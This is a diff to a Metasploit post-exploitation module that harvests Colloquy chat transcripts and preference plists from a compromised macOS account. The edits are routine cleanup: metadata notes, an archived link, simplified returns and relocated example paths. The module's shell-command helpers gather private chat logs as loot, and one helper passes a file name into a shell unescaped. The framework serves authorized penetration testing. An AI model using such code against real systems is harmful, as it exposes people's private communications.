@@ -29,7 +29,12 @@ class MetasploitModule < Msf::Post
           ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],
           ['ALL', { 'Description' => 'Collect both the plists and chat logs' }]
         ],
-        'DefaultAction' => 'ALL'
+        'DefaultAction' => 'ALL',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
 
@@ -42,12 +47,11 @@ class MetasploitModule < Msf::Post
 
   #
   # Parse a plst file to XML format:
-  # http://hints.macworld.com/article.php?story=20050430105126392
+  # https://web.archive.org/web/20141112034745/http://hints.macworld.com/article.php?story=20050430105126392
   #
   def plutil(filename)
     exec("plutil -convert xml1 #{filename}")
-    data = exec("cat #{filename}")
-    return data
+    exec("cat #{filename}")
   end
 
   def get_chatlogs(base)
@@ -125,7 +129,7 @@ class MetasploitModule < Msf::Post
   def exec(cmd)
     tries = 0
     begin
-      out = cmd_exec(cmd).chomp
+      cmd_exec(cmd).chomp
     rescue ::Timeout::Error => e
       tries += 1
       if tries < 3
@@ -150,6 +154,10 @@ class MetasploitModule < Msf::Post
     @peer = "#{session.session_host}:#{session.session_port}"
     user = whoami
 
+    # Examples:
+    # /Users/[user]/Library/Preferences/info.colloquy.plist
+    # /Users/[user]/Documents/Colloquy Transcripts
+    # /Users/[user]/Documents/Colloquy Transcripts//[server]/[contact] 10-13-11.colloquyTranscript
     transcripts_path = "/Users/#{user}/Documents/Colloquy Transcripts/"
     prefs_path = "/Users/#{user}/Library/Preferences/info.colloquy.plist"
 
@@ -160,11 +168,3 @@ class MetasploitModule < Msf::Post
     save(:chatlogs, chatlogs) if !chatlogs.nil? && !chatlogs.empty?
   end
 end
-
-=begin
-/Users/[user]/Documents/Colloquy Transcripts
-/Users/[user]/Library/Preferences/info.colloquy.plist
-
-Transcript example:
-/Users/[username]/Documents/Colloquy Transcripts//[server]/[contact] 10-13-11.colloquyTranscript
-=end
